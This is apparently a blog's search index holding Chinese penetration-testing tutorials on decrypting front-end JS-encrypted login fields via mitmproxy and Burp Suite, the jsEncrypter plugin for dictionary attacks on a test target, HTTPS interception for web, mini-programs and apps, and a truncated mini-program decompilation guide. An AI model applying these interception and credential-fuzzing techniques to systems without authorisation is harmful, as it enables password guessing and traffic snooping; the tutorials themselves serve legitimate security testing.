<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>前端JS加密与Buspsuite的坦诚相待</title>
      <link href="/2024/01/18/%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E4%B8%8EBuspsuite%E7%9A%84%E5%9D%A6%E8%AF%9A%E7%9B%B8%E5%BE%85/"/>
      <url>/2024/01/18/%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E4%B8%8EBuspsuite%E7%9A%84%E5%9D%A6%E8%AF%9A%E7%9B%B8%E5%BE%85/</url>
      
        <content type="html"><![CDATA[<h1 id="前端JS加密测试场景下的困惑"><a href="#前端JS加密测试场景下的困惑" class="headerlink" title="前端JS加密测试场景下的困惑"></a>前端JS加密测试场景下的困惑</h1><p>在渗透测试过程中经常会遇到JS前端加密的场景，假如不借助任何工具的情况下，我们一般是把JS代码进行扣取，本地进行加解密生成Payload，然后在Burpsuite里进行Payload替换。这种方式就存在一个很明显的问题，那就是在大量的Fuzz测试过程中，本地生成再手工替换会消耗大量的时间，这个时候我们就会想，能不能直接在Burpsuite前后利用脚本的形式进行加解密操作，让数据在Burpsuie里展示的时候已经是加解密后的数据呢？</p><h1 id="代理的理解"><a href="#代理的理解" class="headerlink" title="代理的理解"></a>代理的理解</h1><p>先来看看平常我们渗透场景下Burpsuite代理转发数据包的原理</p><p>不挂Burpsuite代理，客户端浏览器直接访问服务器的流程</p><p><img src="/assets/image-20240118102838-d5ufpfy.png" alt="image.png"></p><p>挂上Burpsuite代理之后</p><p><img src="/assets/image-20240118102710-h6jv9qa.png" alt="image.png"></p><p>现在想要在Burpsuite代理转发前后添加脚本进行加解密操作，那分别在客户端浏览器与Burpsuite之间、Burpsuite与服务端服务器之间添加一个代理即可实现。</p><p><img src="/assets/image-20240118103149-p0pc8ny.png" alt="image.png"></p><p>接下来就是分别实现这些代理功能了。市面上已经有很多优秀的类似代理工具，我们可以使用Python脚本进行编写加解密代码然后完成代理实现如上功能，但这样做每次进行不同的网站测试就需要每次都要修改自己的Python脚本，扩展性非常差。这里我们可以使用mitmproxy 来实现我们的需求。</p><h1 id="mitmproxy简介"><a href="#mitmproxy简介" class="headerlink" title="mitmproxy简介"></a>mitmproxy简介</h1><p>mitmproxy 是一个免费的 和开源 交互式 HTTPS 代理，可为 HTTP&#x2F;1、HTTP&#x2F;2 和 WebSocket 提供支持 SSL&#x2F;TLS 的交互式拦截代理。相比于其他代理工具其优势有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">相对于fiddle代理工具，它可以跨平台</span><br><span class="line">相对于跨平台charles代理工具，它开源免费</span><br><span class="line">它支持使用Python进行二次开发，可以结合业务进行灵活拓展了</span><br></pre></td></tr></table></figure><p>mitmproxy下载地址如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mitmproxy.org/</span></span><br></pre></td></tr></table></figure><p>mitmproxy安装完成后有如下三个工具</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy：命令行交互工具</span><br><span class="line">mitmdump：命令行非交互工具</span><br><span class="line">mitmweb：基于Web的用户界面</span><br></pre></td></tr></table></figure><p>在客户端浏览器与Burpsuite之间、Burpsuite与服务端服务器之间的代理也分别有他们名词，分别为下游代理、上游代理。</p><p><img src="/assets/image-20240118110008-djo6vww.png" alt="image.png"></p><p>mitmproxy一大优势是支持Python的二次开发的，而在代理原理图中的请求和响应也依次对应着，mitmproxy提供Python中API的request和response。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line">from mitmproxy.http <span class="keyword">import</span> HTTPFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAddon</span>:</span><br><span class="line">    def <span class="title function_">request</span><span class="params">(self, flow: HTTPFlow)</span>:</span><br><span class="line">        # 这里可以处理请求，比如打印请求信息</span><br><span class="line">        ctx.log.info(f<span class="string">&quot;Handling request: &#123;flow.request.pretty_url&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">response</span><span class="params">(self, flow: HTTPFlow)</span>:</span><br><span class="line">        # 这里可以处理响应，比如修改响应内容</span><br><span class="line">        ctx.log.info(f<span class="string">&quot;Handling response for: &#123;flow.request.pretty_url&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    MyAddon(),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="mitmproxy实战使用"><a href="#mitmproxy实战使用" class="headerlink" title="mitmproxy实战使用"></a>mitmproxy实战使用</h1><p>启动一个服务器，模拟口令登陆功能</p><p><img src="/assets/image-20240118111707-6xp0y4l.png" alt="image.png"></p><p>在只配置Burpsuite代理下登陆抓包</p><p><img src="/assets/image-20240118112118-ubm5wst.png" alt="image.png"></p><p>可以看到password字段是被加密的，当然这里只是一个简单的Base64加密，Burpsuite也支持直接在Burpsuite中直接解密数据，为了演示和后面编写Python脚本方便，这里就先假设Burpsuite上是不可对Password这个字段直接进行解密的。</p><p>在浏览器客户端到Burpsuite之前，我们最常做的处理就是把前端JS加密的数据解密到Burpsuite里，在Burpsuite里直接看到明文的数据。所以在客户端到Burpsuite我们走的一条流程就如下</p><p><img src="/assets/image-20240118115754-xfl8zye.png" alt="image.png"></p><p>那么我们可以进行编写如下脚本</p><p><strong>de.py</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAddon</span>():</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">request</span><span class="params">(self,flow)</span>:</span><br><span class="line">        # 服务端host</span><br><span class="line">        <span class="keyword">if</span> flow.request.host==<span class="string">&quot;www.xj.com&quot;</span>:</span><br><span class="line">            # 获取客户端浏览器发送的数据</span><br><span class="line">            req = flow.request.get_text()</span><br><span class="line">            #截取password字段的加密字段值</span><br><span class="line">            result = req.split(<span class="string">&quot;&amp;&quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            #打印password字段的加密字段值</span><br><span class="line">            ctx.log.info(<span class="string">&quot;浏览器请求数据 =&gt; &quot;</span>+result)</span><br><span class="line">            #对password字段的加密字段值进行解密</span><br><span class="line">            missing_padding = len(result) % <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> missing_padding:</span><br><span class="line">                result += <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">            data = base64.b64decode(str(result).encode()).decode()</span><br><span class="line">            #打印解密后的数据</span><br><span class="line">            ctx.log.info(<span class="string">&quot;解密后的数据 =&gt; &quot;</span> + data)</span><br><span class="line">            #重组<span class="type">Payload</span></span><br><span class="line">            <span class="variable">new_req</span> <span class="operator">=</span> req.split(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>]+<span class="string">&quot;password=&quot;</span>+data</span><br><span class="line">            #发送Payload</span><br><span class="line">            flow.request.set_text((new_req))</span><br><span class="line"></span><br><span class="line">addons = [MyAddon(),]</span><br></pre></td></tr></table></figure><p>编写好脚本之后，需要配置好代理，代理配置如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">客户端浏览器代理转发给下游代理  代理端口为<span class="number">7070</span></span><br><span class="line">下游代理代理转发给Burpsuite   代理端口为<span class="number">8080</span></span><br></pre></td></tr></table></figure><p>浏览器代理配置</p><p><img src="/assets/image-20240118114221-vvl3m33.png" alt="image.png"></p><p>mitmdump代理配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -p <span class="number">7070</span> -s de.py --mode upstream:http:<span class="comment">//127.0.0.1:8080 --ssl-insecure</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20240118114312-qhebvvr.png" alt="image.png"></p><p>Burpsuite代理配置</p><p><img src="/assets/image-20240118114439-ol4occ8.png" alt="image.png"></p><p>配置好，我们重新进行抓包，可以看到已经可以成功解密数据，直接在Burpsuite里进行明文显示了</p><p><img src="/assets/image-20240118114556-db9jj66.png" alt="image.png"></p><p><img src="/assets/image-20240118114653-ruqkc0i.png" alt="image.png"></p><p>提交之后，会提示Login failed!</p><p><img src="/assets/image-20240118115227-8a6vii6.png" alt="image.png"></p><p>其实口令admin、admin是正确的，只不过我们提交password已经是明文的admin了，后面还会对这个admin进行解密，导致解密后的口令就不再正确了，所以我们还需要在Burpsuite把数据提交给服务端服务器之前，重新把数据给加密回来。</p><p>所以在Burpsuite到服务端我们走的一条流程就如下</p><p><img src="/assets/image-20240118115818-4w3mp7n.png" alt="image.png"></p><p>那么我们可以进行编写如下脚本</p><p><strong>en.py</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAddon</span>():</span><br><span class="line">    def <span class="title function_">request</span><span class="params">(self,flow)</span>:</span><br><span class="line">        # 服务端host</span><br><span class="line">        <span class="keyword">if</span> flow.request.host==<span class="string">&quot;www.xj.com&quot;</span>:</span><br><span class="line">            req = flow.request.get_text()</span><br><span class="line">            ctx.log.info(<span class="string">&quot;浏览器请求数据 =&gt; &quot;</span> + req)</span><br><span class="line">            result = req.split(<span class="string">&quot;&amp;&quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            ctx.log.info(<span class="string">&quot;匹配前 =&gt; &quot;</span> + result)</span><br><span class="line">            data = base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            ctx.log.info(<span class="string">&quot;加密后数据 =&gt; &quot;</span> + data)</span><br><span class="line">            #重新组合<span class="type">payload</span></span><br><span class="line">            <span class="variable">new_req</span> <span class="operator">=</span> req.split(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>]+<span class="string">&quot;password=&quot;</span>+data</span><br><span class="line">            ctx.log.info(<span class="string">&quot;最终payload =&gt; &quot;</span> + new_req)</span><br><span class="line">            flow.request.set_text(new_req)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [MyAddon(),]</span><br></pre></td></tr></table></figure><p>编写好脚本之后，之前的代理配置不需要改变，额外在Burpsuite里配置一个上游代理</p><p>Burpsuite代理配置</p><p><img src="/assets/image-20240118133937-kil6su8.png" alt="image.png"></p><p>mitmdump代理配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -p <span class="number">9090</span> -s en.py --ssl-insecure</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20240118134554-5l22f83.png" alt="image.png"></p><p>配置好后，抓包提交</p><p><img src="/assets/image-20240118134825-iptr52m.png" alt="image.png"></p><p>至此，整个测试流程就跑通了。</p><p>当然我们这里的只演示了上面请求流程</p><p><img src="/assets/image-20240118135046-6qlehlg.png" alt="image.png"></p><p>下面的响应流程我们也可以更具业务需求在脚本的response方法里编写相应流程代码即可，且mitmproxy的功能也非常强大，这里也只是演示了其中的一小部分功能，更多功能也可移步到官网继续学习。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//docs.mitmproxy.org/stable/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透代理 </tag>
            
            <tag> JS逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透攻防之前端JS加密该如何破局</title>
      <link href="/2023/12/18/%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E4%B9%8B%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E8%AF%A5%E5%A6%82%E4%BD%95%E7%A0%B4%E5%B1%80/"/>
      <url>/2023/12/18/%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E4%B9%8B%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E8%AF%A5%E5%A6%82%E4%BD%95%E7%A0%B4%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透测试过程中最常见的一种场景就是登录框，而在登录框上最头疼的就是登录框参数字段的值被进行了加密，我们无法进行下一步的FUZZ OR Intruder，导致很多时候错过很多漏洞。那么碰到这种情况该怎么办呢？</p><h1 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h1><p>在参数被进行加密的情况下可以对其进行解密或者来模拟其JS加密方式，这涉及到JS逆向。而在JS逆向中，常常用到的两种方法就是JS扣取和补全JS环境，但是在我们渗透测试的过程中，我们常常采用的方法就是JS扣取，假如需要用到补全JS环境去进行JS逆向，个人感觉性价比就比较低了，因为就算我们花大量的时间去补全了环境能够进行解密，其系统也不一定存在漏洞。所以这里主要介绍一下JS扣取，早期JS扣取我是直接把JS代码扣取出来利用一些脚本语言去模拟他的加密算法，后面我常用的就是一款BP插件，可以简化如上步骤。</p><p><strong>项目地址如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/c0ny1/jsEncrypter</span></span><br></pre></td></tr></table></figure><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载插件，进行编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn <span class="keyword">package</span></span><br></pre></td></tr></table></figure><p>也可以用Releases里面项目作者编译好的</p><p>编译好把target里的jar文件添加进去</p><p><img src="/assets/image-20231218095826-pco6utd.png" alt="image.png"></p><p><img src="/assets/image-20231218100014-83rkim4.png" alt="image.png"></p><p>添加好就可以在BP里面看到如下界面</p><p><img src="/assets/image-20231218100143-dtb3ivw.png" alt="image.png"></p><p>然后该项目里面还提供了一个test文件夹</p><p><img src="/assets/image-20231218100329-f6vwcmw.png" alt="image.png"></p><p>test文件夹里面存放的是一个PHP版本的测试靶机，我们可以利用靶机试试该插件的有效性</p><p>首先把test文件夹下的webapp测试代码搭建起来（可以直接使用PhpStudy，把webapp直接放在PhpStudy的Web目录即可），搭建完成如下</p><p><img src="/assets/image-20231218100906-1qk492l.png" alt="image.png"></p><p>靶机提供了7个算法对密码进行加密后传输</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br><span class="line">md5</span><br><span class="line">sha1</span><br><span class="line">sha254</span><br><span class="line">sha384</span><br><span class="line">sha512</span><br><span class="line">RSA</span><br></pre></td></tr></table></figure><p>这里我们选一个RSA来进行测试，抓包发现password字段被加密</p><p><img src="/assets/image-20231218102746-7ymd4c8.png" alt="image.png"></p><p>可以在源代码中看到加密逻辑如下</p><p><img src="/assets/image-20231218101452-cb36qus.png" alt="image.png"></p><p>引用了js&#x2F;jsencrypt.js文件，但是这里还缺少了一个PublicKey，一般在JS攻防之中，PublicKey常常会被混淆处理，靶机是为了测试用，所以PublicKey被直接写在了源代码之中（其实实际开发中，也有很多PublicKey是没做混淆的）</p><p><img src="/assets/image-20231218102229-yhbsfy0.png" alt="image.png"></p><p>那我们来模拟它的加密环境，首先下载一个phantomjs，安装之后添加到环境变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//phantomjs.org/download.html</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20231218103546-rqv89x9.png" alt="image.png"></p><p>然后把加密逻辑添加进phantomjs_server.js文件里面</p><p><img src="/assets/image-20231218104343-nkf4vyk.png" alt="image.png"></p><p><img src="/assets/image-20231218104304-orlz36u.png" alt="image.png"></p><p>然后把靶机中jsencrypt.js代码复制出来，我这里重命名为了rsa.js（注意假如，加密引用了多个文件，LoadScript里面的引用顺序也要和浏览器的顺序一致）</p><p><img src="/assets/image-20231218104817-dxru8e2.png" alt="image.png"></p><p>然后启动server</p><p><img src="/assets/image-20231218105028-nui5zvg.png" alt="image.png"></p><p>回到BP里面进行连接测试，如下服务器启动成功</p><p><img src="/assets/image-20231218105144-jhahgcf.png" alt="image.png"></p><p><img src="/assets/image-20231218105341-eqj3jk3.png" alt="image.png"></p><p>加密正常后，我们就可以正常加载我们自己的测试字典，然后走我们的插件进行模拟加密就ok</p><p><img src="/assets/image-20231218105823-q7yc7ie.png" alt="image.png"></p><p><img src="/assets/image-20231218105839-kjkaex4.png" alt="image.png"></p><p><img src="/assets/image-20231218105924-1hd5m34.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> JS逆向 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对不同测试场景下的三套抓包配置</title>
      <link href="/2023/07/06/%E9%92%88%E5%AF%B9%E4%B8%8D%E5%90%8C%E6%B5%8B%E8%AF%95%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E4%B8%89%E5%A5%97%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/07/06/%E9%92%88%E5%AF%B9%E4%B8%8D%E5%90%8C%E6%B5%8B%E8%AF%95%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E4%B8%89%E5%A5%97%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>对于不同的测试场景，如Web、小程序、App等，我们往往会使用不同的抓包方案来完成我们测试，以下便是笔者本人在不同场景下使用的三套抓包方案。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>Web场景也是我们平常最多的抓包场景，而我们利用Burpsuite无法直接抓取到HTTPS的流量，想要抓到HTTPS流量需要进行如下配置。</p><p>配置Burpsuite代理</p><p><img src="/assets/image-20230526205915-cl26t35.png" alt="image.png"></p><p>在浏览器配置代理</p><p><img src="/assets/image-20230526210015-jfegnuk.png" alt="image.png"></p><p>访问如下地址进行下载证书</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//burp/</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230526210108-1oi6g84.png" alt="image.png"></p><p>进入到谷歌浏览器–&gt;设置–&gt;隐私和安全–&gt;管理设备证书</p><p><img src="/assets/image-20230526210257-6xwey0g.png" alt="image.png"></p><p>在受信任的根证书颁发机构导入刚才下载好的证书即可</p><p><img src="/assets/image-20230526210751-b65wyjx.png" alt="image.png"></p><p>成功导入后可以找到我们的证书</p><p><img src="/assets/image-20230526210900-cjs7c0i.png" alt="image.png"></p><p>且可正常抓取HTTPS的流量</p><p><img src="/assets/image-20230526211656-mo6yxzm.png" alt="image.png"></p><h1 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h1><p>小程序我们无法直接通过浏览器进行访问，所以我们抓取手机（模拟器）的流量来对小程序进行抓包，这里借助夜神模拟器来进行演示。</p><p>由于微信的更新，太高版本的微信可能抓不到https的数据包</p><blockquote><p>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</p></blockquote><p>我这里的模拟器是在安卓7.0以下，所以支持任何版本的微信</p><p>首先配置buspsuite的代理</p><p><img src="/assets/image-20230705092534-znbbp32.png" alt="image.png"></p><p>然后来到模拟器中，点击设置，点击WLAN</p><p><img src="/assets/image-20230705092716-0wli4fu.png" alt="image.png"></p><p>之后长按出现如下之后，点击修改网络</p><p><img src="/assets/image-20230705092801-nobvdkn.png" alt="image.png"></p><p>点击高级选项进行手动配置代理</p><p><img src="/assets/image-20230705092836-ahk3cq0.png" alt="image.png"></p><p>然后把之前在burpsuite设置的ip和端口进行填写即可</p><p><img src="/assets/image-20230705093059-y42xy9w.png" alt="image.png"></p><p>接下来在模拟器中的浏览器里访问配置的代理地址和端口进行证书的下载</p><p><img src="/assets/image-20230705093314-4zh6hro.png" alt="image.png"></p><p>下载之后将下载的cacert.der文件修改为cacert.cer，再打开设置–&gt;安全</p><p><img src="/assets/image-20230705112444-9mtvrdd.png" alt="image.png"></p><p>选择从SD卡安装</p><p><img src="/assets/image-20230705112515-2tk6mhq.png" alt="image.png"></p><p>选择证书安装即可</p><p><img src="/assets/image-20230705112547-kcdpppy.png" alt="image.png"></p><p>安装成功后可在信任的凭据查看已安装的证书</p><p><img src="/assets/image-20230705112623-ntclchr.png" alt="image.png"></p><p><img src="/assets/image-20230705112704-lw4frbk.png" alt="image.png"></p><p>证书成功安装后就去测试抓包，打开微信，打开一个小程序</p><p><img src="/assets/image-20230705113432-9sib6ox.png" alt="image.png"></p><p>可成功抓取到数据包</p><h1 id="App"><a href="#App" class="headerlink" title="App"></a>App</h1><p>其实也能用抓小程序的抓包方案也能抓取App的数据包，但是App有时会限制模拟器打开，用真实手机抓包然后转发到Burpsuite上能帮我们解决掉许多不必要的麻烦。</p><p>这里我使用的抓取App数据包的方案是</p><blockquote><p>手机+Postern+Charles+Burpsuite</p></blockquote><h2 id="Charles配置"><a href="#Charles配置" class="headerlink" title="Charles配置"></a>Charles配置</h2><p>Charles 是一款常用的网络抓包工具，通过将自己设置成系统的网络访问代理服务器，用于调试与服务器端的网络通讯协议，除了常见的http协议的抓包，Charles 还可以分析 Https 协议。</p><p>其<strong>下载地址</strong>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.charlesproxy.com/latest-release/download.do</span></span><br></pre></td></tr></table></figure><p>Charles下载后只有30天免费使用权限，试用期过后，未付费的用户仍然可以继续使用过，但每次使用时间不能超过 30 分钟。</p><p>这里不演示具体破解方法了，网上有很多该软件破解教程，可以自行研究一下。</p><p>安装好之后，打开软件如下</p><p><img src="/assets/image-20230705150312-on6sipv.png" alt="image.png"></p><p>我们首先要给安卓手机导入Charles的系统证书，在Help–&gt;SSL Proxying下</p><p><img src="/assets/image-20230705150444-ke8yj3w.png" alt="image.png"></p><p>把保存的pem后缀文件修改成后缀为cer，后面安装证书方法和小程序中类似或直接点击证书文件即可</p><p><img src="/assets/image-20230705152752-xyn32tt.png" alt="image.png"></p><p>填写证书名称后点击确定即可安装成功</p><p><img src="/assets/image-20230705152951-fxgifit.png" alt="image.png"></p><p>因为后续需要把数据包转发到burpsuite，便于数据包在burpsuite上的更改，所以我们的burpsuite还需要导入charles的证书，在Help–&gt;SSL Proxying下</p><p><img src="/assets/image-20230705154330-zzu3q0f.png" alt="image.png"></p><p>然后输入一个你设置的密码</p><p><img src="/assets/image-20230705154421-nsospu0.png" alt="image.png"></p><p>保存为p12文件，打开burpsuite，把该文件进行导入</p><p><img src="/assets/image-20230705154754-2jdl42z.png" alt="image.png"></p><p>选择文件，添加密码即可</p><p><img src="/assets/image-20230705154855-x3utv32.png" alt="image.png"></p><p>证书都准备完成之后，就需要对charles做一些代理配置，在Proxy–&gt;Proxy Settings</p><p><img src="/assets/image-20230705155225-9zw60jq.png" alt="image.png"></p><p>这里分别配置一个HTTP代理和一个SOCKS代理</p><p><img src="/assets/image-20230705155522-sb5cy2s.png" alt="image.png"></p><p>然后在proxy-&gt;ssl proxy settings</p><p><img src="/assets/image-20230705155616-vcnck8e.png" alt="image.png"></p><p>配置两个*号，让其匹配所有Host和Port</p><p><img src="/assets/image-20230705155722-fzos3gb.png" alt="image.png"></p><p>配置完成后依次点击ok即可</p><h2 id="Postern配置"><a href="#Postern配置" class="headerlink" title="Postern配置"></a>Postern配置</h2><p>Postern 是一款 Android 平台上的代理工具，可以帮助用户实现全局代理、分应用代理等多种代理方式。</p><p><strong>下载地址</strong>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:<span class="comment">//pan.baidu.com/s/11MOwX2c2brWOeSx2-eyzxw?pwd=9ke9 </span></span><br><span class="line">提取码：9ke9 </span><br></pre></td></tr></table></figure><p>直接在需要抓包的手机上选中文件里的apk文件进行安装即可</p><p>安装成功后先在Postern配置SOCKS代理</p><p><img src="/assets/image-20230705160500-91tyrio.png" alt="image.png"></p><p>这里的地址和端口都要和之前配置的SOCKS地址和端口一致</p><p><img src="/assets/image-20230705160701-du9fmsu.png" alt="image.png"></p><p>然后进行匹配规则的配置</p><p><img src="/assets/image-20230705160937-1yr59hc.png" alt="image.png"></p><p>清空之后配置如下规则</p><p><img src="/assets/image-20230705161015-eydlrid.png" alt="image.png"></p><p>然后打开VPN</p><p><img src="/assets/image-20230705161211-wba6nz1.png" alt="image.png"></p><p>配置一切正常之后会有弹出如下对话框，点击allow允许即可</p><p><img src="/assets/image-20230705161148-ojm0r6j.png" alt="image.png"></p><p>之后在手机上打开App就可抓到数据包了</p><p><img src="/assets/image-20230705161332-zctz83k.png" alt="image.png"></p><h2 id="转发burpsuite"><a href="#转发burpsuite" class="headerlink" title="转发burpsuite"></a>转发burpsuite</h2><p>抓取到数据包之后，我们可以把数据包转发到burpsuite上进行测试，在proxy–&gt;external proxy settings</p><p><img src="/assets/image-20230705161529-llwm2a9.png" alt="image.png"></p><p>配置好buspsuite监听的端口即可</p><p><img src="/assets/image-20230705161759-jurq74p.png" alt="image.png"></p><p><img src="/assets/image-20230705161818-bwf316j.png" alt="image.png"></p><p>配置完成后可在bp上成功接受到数据包</p><p><img src="/assets/image-20230705164151-g7gas7p.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序反编译实战</title>
      <link href="/2023/05/30/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E5%AE%9E%E6%88%98/"/>
      <url>/2023/05/30/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>在平常小程序测试当中，我们可以把小程序进行反编译查看小程序内部API接口进行一个详细的测试</p><h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><p>安装nodejs</p><p>安装WxAppUnpacker，然后执行npm install安装依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:<span class="comment">//pan.baidu.com/s/1Vos95RvtcOauqQB12yS8nA?pwd=1ea6 </span></span><br><span class="line">提取码：1ea6 </span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230527143812-8pc0feu.png" alt="image.png"></p><h1 id="手机提取小程序数据包"><a href="#手机提取小程序数据包" class="headerlink" title="手机提取小程序数据包"></a>手机提取小程序数据包</h1><p>提取小程序数据包可以使用手机或借助模拟器进行提取，这里演示模拟器的提取方式，真实手机提取方式类似</p><p>首先进行一个小程序，让微信把小程序的包加载过来（尽可能在小程序里面把所有功能点击全，这样会把所有分包尽可能的加载到）</p><p><img 